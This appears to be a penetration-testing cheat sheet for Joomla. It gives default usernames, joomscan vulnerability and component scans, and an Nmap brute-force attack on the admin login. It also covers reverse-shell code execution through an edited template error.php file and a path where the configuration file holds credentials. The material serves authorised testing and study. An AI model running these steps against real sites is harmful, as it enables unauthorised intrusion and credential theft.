# Joomla

### 1) Default users

    joomla
    admin

### 2) Scan Joomla for information and vulnerabilities

    joomscan --url http://domain.local/joomla

Enumerate components

    joomscan --url http://domain.local/joomla -ec

### 3) Brute force Joomla administrator page

#### Nmap

Create a users wordlist

    joomla
    admin

Modify the http-joomla-brute.nse script to be used (if joomla installation is not in webroot)

    sudo nano /usr/share/nmap/scripts/http-joomla-brute.nse

Modify the specific line:

    local DEFAULT_JOOMLA_LOGIN_URI = "/joomla/administrator/index.php"

Run the attack

    nmap -sV --script http-joomla-brute --script-args 'userdb=users.txt,passdb=wordlist.txt' IP

## Admin Panel RCE (Requires Credentials)

### 1) Edit error.php on Site Templates

Go to:

    System -> Extensions -> Site templates -> templates

Find the active template of the site, then edit the error.php file with a PHP reverse shell

Trigger the shell

    curl -k "http://DOMAIN.LOCAL/templates/TEMPLATE_NAME/error.php/error"

## Configuration files that might contain credentials

### 1) configuration.php

    /var/www/joomla/configuration.php
